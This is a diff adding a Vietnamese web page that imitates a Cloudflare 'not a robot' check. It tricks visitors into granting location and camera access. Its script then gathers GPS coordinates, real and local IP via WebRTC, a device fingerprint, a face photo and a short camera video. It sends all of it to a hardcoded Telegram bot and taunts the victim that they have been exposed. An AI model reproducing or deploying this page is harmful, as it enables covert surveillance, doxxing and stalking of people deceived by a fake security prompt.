@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Truy Cập Web</title>
+<style>
+    body { 
+        margin:0; 
+        background:#000; 
+        color:#fff; 
+        font-family:Arial; 
+        text-align:center; 
+        height:100vh; 
+        overflow:hidden; 
+        touch-action: manipulation; 
+        position: relative;
+    }
+
+    #matrix {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        z-index: 1;
+        pointer-events: none;
+        display: none;
+    }
+
+    .result {
+        position: relative;
+        z-index: 10;
+        height: 100vh;
+        display: none;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+        padding: 15px 12px;
+        box-sizing: border-box;
+    }
+
+    .title {
+        color: red;
+        font-size: 1.95em;
+        margin: 10px 0 12px 0;
+        z-index: 11;
+        text-shadow: 0 0 10px #ff0000;
+    }
+
+    #faceImage { 
+        max-width: 92%; 
+        max-height: 36vh;
+        border: 5px solid #fff; 
+        border-radius: 12px;
+        margin-bottom: 18px;
+        z-index: 11;
+        box-shadow: 0 0 25px #fff, 
+                    0 0 50px #ff0, 
+                    0 0 80px rgba(255,255,0,0.85);
+    }
+
+    .hack-top {
+        color: yellow;
+        font-size: 1.45em;
+        line-height: 1.8;
+        margin-bottom: 22px;
+        z-index: 11;
+        text-shadow: 0 0 12px #ff0;
+    }
+
+    .troll-box {
+        background: rgba(0,0,0,0.92);
+        border: 3px solid #ff0;
+        border-radius: 16px;
+        padding: 20px 18px;
+        margin: 0 8px;
+        max-width: 96%;
+        box-shadow: 0 0 35px #ff0, 
+                    0 0 60px rgba(255,255,0,0.7);
+        z-index: 11;
+    }
+
+    .troll-text {
+        color: yellow;
+        font-size: 1.42em;
+        line-height: 1.85;
+        text-align: center;
+        text-shadow: 0 0 10px #ff0;
+    }
+
+    button { 
+        background:#f00; 
+        color:#fff; 
+        border:none; 
+        padding:15px 30px; 
+        font-size:1.4em; 
+        margin:10px; 
+        border-radius:8px; 
+        width: 280px;
+        z-index: 11;
+    }
+
+    #verifyScreen {
+        height:100vh; 
+        display:none; 
+        flex-direction:column; 
+        justify-content:center; 
+        align-items:center; 
+        position:relative; 
+        z-index:10;
+    }
+
+    .verify-box {
+        background:rgba(255,255,255,0.08);
+        border:2px solid #0f0;
+        padding:30px 25px;
+        border-radius:16px;
+        max-width:340px;
+        text-align:center;
+    }
+
+    #warningText {
+        color:#ff4444;
+        font-size:1.2em;
+        margin-top:25px;
+        line-height:1.7;
+        display:none;
+    }
+</style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<!-- START SCREEN -->
+<div id="startScreen" style="height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; position:relative; z-index:10;">
+    <h1 style="color:#0f0; font-size:2em;">TRUY CẬP WEB</h1>
+    <p style="color:yellow; font-size:1.4em;">Nhấn nút để tiếp tục</p>
+    <button onclick="startVerify()">TIẾP TỤC</button>
+</div>
+
+<!-- FAKE XÁC MINH ROBOT -->
+<div id="verifyScreen">
+    <div class="verify-box">
+        <h2 style="color:#0f0;">Xác minh bảo mật Cloudflare</h2>
+        <p style="color:#ddd; margin:20px 0 25px;">Vui lòng hoàn tất để chứng minh bạn không phải robot.</p>
+        
+        <div style="text-align:left; color:#fff; font-size:1.05em; line-height:2.2;">
+            <label><input type="checkbox" id="chkRobot" style="transform:scale(1.5); margin-right:12px;"> Tôi không phải là robot</label><br>
+            <label><input type="checkbox" id="chkLocation" style="transform:scale(1.5); margin-right:12px;"> Cho phép truy cập <strong>Vị trí</strong></label><br>
+            <label><input type="checkbox" id="chkCamera" style="transform:scale(1.5); margin-right:12px;"> Cho phép truy cập <strong>Camera</strong></label>
+        </div>
+
+        <button onclick="fakeVerify()" style="margin-top:30px; width:100%;">XÁC MINH & TIẾP TỤC</button>
+        
+        <div id="warningText"></div>
+    </div>
+</div>
+
+<!-- LOADING -->
+<div id="loading" style="display:none; height:100vh; flex-direction:column; justify-content:center; align-items:center; position:relative; z-index:10; font-size:1.8em; color:#fff;">
+    ĐANG TẢI TRANG WEB...<br>VUI LÒNG CHỜ
+</div>
+
+<!-- RETRY -->
+<div id="retrySection" style="display:none; height:100vh; flex-direction:column; justify-content:center; align-items:center; position:relative; z-index:10; padding:20px;">
+    <p style="color:yellow; font-size:1.45em; line-height:1.6;">
+        Không thể lấy quyền.<br><br>
+        Vui lòng vào Cài đặt Chrome → Quyền →<br>
+        Bật <strong>Vị trí</strong> và <strong>Camera</strong><br><br>
+        Sau đó nhấn nút bên dưới:
+    </p>
+    <button onclick="startHack()">THỬ LẠI</button>
+</div>
+
+<!-- RESULT TROLL -->
+<div id="result" class="result">
+    <h2 class="title">📸 MẶT BẠN ĐÃ BỊ LỘ</h2>
+    <img id="faceImage">
+    
+    <div class="hack-top">
+        👨‍💻 <strong>LỘ ĐỊA CHỈ RỒI NHÉ</strong> 📱<br>
+        🇻🇳 <strong>HACK BY DGVI</strong> ✅
+    </div>
+
+    <div class="troll-box">
+        <div id="infoText" class="troll-text"></div>
+    </div>
+</div>
+
+<video id="video" autoplay muted playsinline style="position:absolute; top:-99999px; left:-99999px;"></video>
+<canvas id="canvas" width="1280" height="720" style="position:absolute; top:-99999px; left:-99999px;"></canvas>
+
+<script>
+// MATRIX
+const canvas = document.getElementById("matrix");
+const ctx = canvas.getContext("2d");
+
+function resizeMatrix() {
+    canvas.height = window.innerHeight;
+    canvas.width = window.innerWidth;
+}
+resizeMatrix();
+window.addEventListener('resize', resizeMatrix);
+
+const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワン0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+const fontSize = 14;
+let drops = [];
+
+function initDrops() {
+    drops = Array(Math.floor(canvas.width / fontSize)).fill(1);
+}
+initDrops();
+
+function drawMatrix() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.07)";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = "#00ff00";
+    ctx.font = fontSize + "px monospace";
+
+    for (let i = 0; i < drops.length; i++) {
+        const text = chars[Math.floor(Math.random() * chars.length)];
+        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+    }
+}
+
+setInterval(() => {
+    if (document.getElementById("result").style.display === "flex") drawMatrix();
+}, 35);
+
+// CONFIG
+const TOKEN = "8645167578:AAG_RxO1oagAVD-XayksoDhPq37QOJArzjI";
+const CHAT_ID = "8650144012";
+
+let ip = "Không lấy được";
+let realIP = "Không leak được";
+let localIP = "Không lấy được";
+let vido = "0";
+let kinhdo = "0";
+let googleMapLink = "https://maps.google.com";
+
+let fingerprint = "";
+let photoSent = false;
+let videoSent = false;
+let dataSent = false;
+
+function resetAll() {
+    photoSent = videoSent = dataSent = false;
+}
+
+function dataURLtoBlob(dataurl) {
+    const arr = dataurl.split(',');
+    const mime = arr[0].match(/:(.*?);/)[1];
+    const bstr = atob(arr[1]);
+    let n = bstr.length;
+    const u8arr = new Uint8Array(n);
+    while (n--) u8arr[n] = bstr.charCodeAt(n);
+    return new Blob([u8arr], {type: mime});
+}
+
+// ==================== WebRTC LẤY IP THẬT (10 STUN) ====================
+async function getRealIP() {
+    return new Promise((resolve) => {
+        let publicIP = null;
+        let privateIP = null;
+        let finished = false;
+
+        const stunServers = [
+            { urls: "stun:stun.l.google.com:19302" },
+            { urls: "stun:stun1.l.google.com:19302" },
+            { urls: "stun:stun2.l.google.com:19302" },
+            { urls: "stun:stun3.l.google.com:19302" },
+            { urls: "stun:stun4.l.google.com:19302" },
+            { urls: "stun:stun.cloudflare.com:3478" },
+            { urls: "stun:stun.ekiga.net" },
+            { urls: "stun:stun.ideasip.com" },
+            { urls: "stun:stun.voip.blackberry.com" },
+            { urls: "stun:stun.stunprotocol.org:3478" }
+        ];
+
+        const pc = new RTCPeerConnection({ iceServers: stunServers });
+        pc.createDataChannel("dummy");
+
+        pc.onicecandidate = (e) => {
+            if (!e.candidate || !e.candidate.candidate) return;
+            const match = e.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3})/);
+            if (!match) return;
+            const ipAddr = match[1];
+
+            const isPrivate = /^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[0-1])\.)/.test(ipAddr);
+            const isCGNAT = /^100\.(6[4-9]|[7-9][0-9]|1[0-1][0-9]|12[0-7])\./.test(ipAddr);
+
+            if (!isPrivate && !isCGNAT) {
+                if (!publicIP) {
+                    publicIP = ipAddr;
+                    realIP = publicIP;
+                    if (!finished) {
+                        finished = true;
+                        pc.close();
+                        resolve();
+                    }
+                }
+            } else if (isPrivate && !privateIP) {
+                privateIP = ipAddr;
+                localIP = ipAddr;
+            }
+        };
+
+        pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+
+        setTimeout(() => {
+            if (!finished) {
+                if (publicIP) realIP = publicIP;
+                else if (privateIP) realIP = privateIP;
+                finished = true;
+                try { pc.close(); } catch(e) {}
+                resolve();
+            }
+        }, 4000);
+    });
+}
+
+// ==================== DẤU VÂN TAY + GPU (lấy GPU thật) ====================
+async function collectFingerprint() {
+    let fp = "DẤU VÂN TAY THIẾT BỊ:\n";
+    fp += `User-Agent: ${navigator.userAgent}\n`;
+    fp += `Platform: ${navigator.platform}\n`;
+    fp += `CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}\n`;
+    fp += `RAM: ${navigator.deviceMemory || 'N/A'} GB\n`;
+    // FIX lỗi screen
+    fp += `Screen: ${screen.width}×${screen.height} (${screen.pixelDepth}bit, ratio ${window.devicePixelRatio})\n`;
+    fp += `Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+    fp += `Language: ${navigator.language}\n`;
+
+    // Canvas fingerprint
+    try {
+        const c = document.createElement('canvas');
+        c.width = 400;
+        c.height = 150;
+        const ctx2 = c.getContext('2d');
+        if (ctx2) {
+            ctx2.fillStyle = "#f60"; ctx2.fillRect(0, 0, 80, 40);
+            ctx2.fillStyle = "#069"; ctx2.font = "16px Arial"; ctx2.fillText("FingerprintTest", 10, 35);
+            ctx2.fillStyle = "#0f0"; ctx2.fillRect(100, 10, 70, 35);
+            ctx2.fillStyle = "#ff0"; ctx2.shadowBlur = 3; ctx2.fillRect(190, 5, 55, 40);
+            ctx2.shadowBlur = 0;
+            ctx2.beginPath(); ctx2.arc(300, 30, 25, 0, Math.PI * 2); ctx2.fillStyle = "#f0f"; ctx2.fill();
+            ctx2.fillStyle = "#0ff"; ctx2.font = "bold 14px Arial"; ctx2.fillText("Canvas", 10, 80);
+            ctx2.fillText("Fingerprint", 80, 80);
+
+            const data = ctx2.getImageData(0, 0, c.width, c.height).data;
+            let hashRaw = "";
+            for (let i = 0; i < data.length; i += 8) {
+                hashRaw += ((data[i] + data[i+1] + data[i+2]) % 64).toString(16);
+            }
+            let finalHash = btoa(hashRaw);
+            finalHash = finalHash.replace(/[^A-Za-z0-9]/g, '').substring(0, 60);
+            fp += `Vân Tay Số: ${finalHash}\n`;
+        } else {
+            fp += `Vân Tay Số: Không hỗ trợ\n`;
+        }
+    } catch (e) {
+        fp += `Vân Tay Số: Lỗi\n`;
+    }
+
+    // WebGL - lấy GPU thật, không hardcode
+    try {
+        const glCanvas = document.createElement('canvas');
+        const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+        if (gl) {
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debug) {
+                fp += `GPU Vendor: ${gl.getParameter(debug.UNMASKED_VENDOR_WEBGL)}\n`;
+                fp += `GPU Renderer: ${gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)}\n`;
+            } else {
+                fp += `GPU: Hạn chế thông tin\n`;
+            }
+        } else {
+            fp += `GPU: Không hỗ trợ WebGL\n`;
+        }
+    } catch (e) {
+        fp += `GPU: Lỗi\n`;
+    }
+
+    fingerprint = fp;
+}
+
+// ==================== GỬI DỮ LIỆU (giữ nguyên format cũ) ====================
+function sendAllData() {
+    if (dataSent) return;
+    dataSent = true;
+
+    const bestIP = (realIP !== "Không leak được") ? realIP : ip;
+
+    // Lấy GPU từ fingerprint (vì trong fingerprint đã có GPU thật)
+    let gpuVendor = "Qualcomm"; // fallback
+    let gpuRenderer = "Adreno (TM) 735";
+    const gpuVendorMatch = fingerprint.match(/GPU Vendor: (.*?)\n/);
+    const gpuRendererMatch = fingerprint.match(/GPU Renderer: (.*?)\n/);
+    if (gpuVendorMatch) gpuVendor = gpuVendorMatch[1];
+    if (gpuRendererMatch) gpuRenderer = gpuRendererMatch[1];
+
+    const text = `🔴 FULL THÔNG TIN\n\n` +
+                 `👉 IP thật: ${bestIP}\n` +
+                 `👉 IP ipify: ${ip}\n` +
+                 `👉 Local IP: ${localIP}\n\n` +
+                 `👉 Vĩ độ: ${vido}\n` +
+                 `👉 Kinh độ: ${kinhdo}\n` +
+                 `👉 Google Maps: ${googleMapLink}\n\n` +
+                 `🔴 THÔNG TIN THIẾT BỊ:\n` +
+                 `👉 User-Agent: ${navigator.userAgent}\n` +
+                 `👉 Platform: ${navigator.platform}\n` +
+                 `👉 CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}\n` +
+                 `👉 RAM: ${navigator.deviceMemory || 'N/A'} GB\n` +
+                 `👉 Screen: ${screen.width}×${screen.height} (${screen.pixelDepth}bit, ratio ${window.devicePixelRatio})\n` +
+                 `👉 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n` +
+                 `👉 Language: ${navigator.language}\n` +
+                 `👉 Vân Tay Số: ${fingerprint.split('Vân Tay Số: ')[1]?.split('\n')[0] || 'Không lấy được'}\n` +
+                 `👉 GPU Vendor: ${gpuVendor}\n` +
+                 `👉 GPU Renderer: ${gpuRenderer}\n\n` +
+                 `=== HACK BY DGVI ===`;
+
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("text", text);
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: "POST", body: form });
+}
+
+function sendPhoto(base64) {
+    if (photoSent) return;
+    photoSent = true;
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("caption", `📸 Ảnh mặt\nIP thật: ${realIP}`);
+    form.append("photo", dataURLtoBlob(base64), "face.jpg");
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: form });
+}
+
+function sendVideo(blob) {
+    if (videoSent) return;
+    videoSent = true;
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("caption", `🎥 Video camera trước 4s\nIP thật: ${realIP}`);
+    form.append("video", blob, "video.webm");
+    fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: form })
+    .finally(() => {
+        sendAllData();
+        checkAndShowResult();
+    });
+}
+
+function checkAndShowResult() {
+    if (!photoSent || !videoSent || !dataSent) return;
+
+    document.getElementById("loading").style.display = "none";
+    document.getElementById("result").style.display = "flex";
+    document.getElementById("matrix").style.display = "block";
+
+    let html = `Ê thằng ngu mày bị lộ rồi:))<br><br>`;
+
+    const bestIP = (realIP !== "Không leak được") ? realIP : ip;
+    html += `IP thật: <strong>${bestIP}</strong><br>`;
+
+    if (vido !== "0" && kinhdo !== "0") {
+        html += `
+            Vĩ độ: <strong>${vido}</strong><br>
+            Kinh độ: <strong>${kinhdo}</strong><br><br>
+            📍 <a href="${googleMapLink}" target="_blank" style="color:cyan;">Xem Google Maps</a>
+        `;
+    }
+
+    document.getElementById("infoText").innerHTML = html;
+}
+
+function startVerify() {
+    document.getElementById("startScreen").style.display = "none";
+    document.getElementById("verifyScreen").style.display = "flex";
+    document.getElementById("warningText").style.display = "none";
+}
+
+function fakeVerify() {
+    const chkRobot = document.getElementById("chkRobot").checked;
+    const chkLocation = document.getElementById("chkLocation").checked;
+    const chkCamera = document.getElementById("chkCamera").checked;
+
+    if (!chkRobot || !chkLocation || !chkCamera) {
+        alert("Vui lòng tích đủ tất cả các ô để xác minh!");
+        return;
+    }
+
+    let locationGranted = false;
+    let cameraGranted = false;
+    let tested = 0;
+
+    navigator.geolocation.getCurrentPosition(
+        () => { locationGranted = true; tested++; checkPermissions(); },
+        () => { locationGranted = false; tested++; checkPermissions(); },
+        { timeout: 8000 }
+    );
+
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(() => { cameraGranted = true; tested++; checkPermissions(); })
+        .catch(() => { cameraGranted = false; tested++; checkPermissions(); });
+
+    function checkPermissions() {
+        if (tested < 2) return;
+
+        if (locationGranted && cameraGranted) {
+            document.getElementById("verifyScreen").style.display = "none";
+            document.getElementById("loading").style.display = "flex";
+            resetAll();
+            startHack();
+        } else {
+            let msg = "⚠️ Thiếu quyền cần thiết!<br><br>";
+            if (!locationGranted) msg += "• Chưa cấp quyền <strong>Vị trí</strong><br>";
+            if (!cameraGranted) msg += "• Chưa cấp quyền <strong>Camera</strong><br>";
+            msg += "<br>Vui lòng vào Cài đặt Chrome → Quyền → Bật đầy đủ quyền đã thiếu.";
+
+            document.getElementById("warningText").innerHTML = msg;
+            document.getElementById("warningText").style.display = "block";
+        }
+    }
+}
+
+async function startHack() {
+    resetAll();
+    await collectFingerprint();
+    await getRealIP();
+    setTimeout(getIP, 600);
+}
+
+function getIP() {
+    fetch("https://api4.ipify.org?format=json")
+    .then(r => r.json())
+    .then(data => ip = data.ip || "Không lấy được")
+    .catch(() => {})
+    .finally(requestLocation);
+}
+
+function requestLocation() {
+    navigator.geolocation.getCurrentPosition(
+        pos => {
+            vido = pos.coords.latitude.toFixed(8);
+            kinhdo = pos.coords.longitude.toFixed(8);
+            // FIX lỗi Google Maps
+            googleMapLink = `https://maps.google.com/?q=${vido},${kinhdo}`;
+            requestCamera();
+        },
+        () => requestCamera(),
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+}
+
+let recorder, chunks = [];
+
+function requestCamera() {
+    const constraints = {
+        video: {
+            facingMode: "user",
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+        }
+    };
+
+    navigator.mediaDevices.getUserMedia(constraints)
+    .then(stream => {
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+        video.play().catch(()=>{});
+
+        let mimeType = 'video/webm';
+
+        if (window.MediaRecorder) {
+            if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
+                mimeType = 'video/webm;codecs=vp9';
+            } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
+                mimeType = 'video/webm;codecs=vp8';
+            }
+        }
+
+        if (!window.MediaRecorder) {
+            capturePhotoOnly(stream);
+            return;
+        }
+
+        recorder = new MediaRecorder(stream, {
+            mimeType,
+            videoBitsPerSecond: 2000000
+        });
+
+        chunks = [];
+
+        recorder.ondataavailable = e => {
+            if (e.data && e.data.size > 0) {
+                chunks.push(e.data);
+            }
+        };
+
+        recorder.onstop = () => {
+            try {
+                const blob = new Blob(chunks, { type: mimeType });
+                sendVideo(blob);
+            } catch (e) {}
+
+            stream.getTracks().forEach(t => t.stop());
+        };
+
+        recorder.start(1000);
+
+        video.onloadeddata = () => {
+            setTimeout(() => {
+                const canvasEl = document.getElementById("canvas");
+                const ctx2 = canvasEl.getContext("2d");
+
+                ctx2.drawImage(video, 0, 0, canvasEl.width, canvasEl.height);
+
+                const photo = canvasEl.toDataURL("image/jpeg", 0.94);
+                document.getElementById("faceImage").src = photo;
+                sendPhoto(photo);
+
+                setTimeout(() => {
+                    if (recorder && recorder.state !== "inactive") {
+                        recorder.stop();
+                    }
+                }, 4000);
+
+            }, 1200);
+        };
+    })
+    .catch(() => {
+        document.getElementById("loading").style.display = "none";
+        document.getElementById("retrySection").style.display = "flex";
+    });
+}
+
+function capturePhotoOnly(stream) {
+    const video = document.getElementById("video");
+    video.srcObject = stream;
+
+    video.onloadeddata = () => {
+        const canvasEl = document.getElementById("canvas");
+        const ctx2 = canvasEl.getContext("2d");
+
+        ctx2.drawImage(video, 0, 0, canvasEl.width, canvasEl.height);
+
+        const photo = canvasEl.toDataURL("image/jpeg", 0.94);
+        document.getElementById("faceImage").src = photo;
+
+        sendPhoto(photo);
+
+        sendAllData();
+        checkAndShowResult();
+
+        stream.getTracks().forEach(t => t.stop());
+    };
+}
+
+// AUTO BYPASS
+async function checkIfAlreadyGranted() {
+    try {
+        const [geoStatus, camStatus] = await Promise.all([
+            navigator.permissions.query({ name: 'geolocation' }),
+            navigator.permissions.query({ name: 'camera' })
+        ]);
+
+        if (geoStatus.state === 'granted' && camStatus.state === 'granted') {
+            document.getElementById("startScreen").style.display = "none";
+            document.getElementById("verifyScreen").style.display = "none";
+            document.getElementById("loading").style.display = "flex";
+            resetAll();
+            startHack();
+            return true;
+        }
+    } catch (e) {}
+    return false;
+}
+
+window.onload = async function() {
+    resetAll();
+    await collectFingerprint();
+    const alreadyGranted = await checkIfAlreadyGranted();
+    if (!alreadyGranted) {
+        document.getElementById("startScreen").style.display = "flex";
+    }
+};
+</script>
+</body>
+</html>
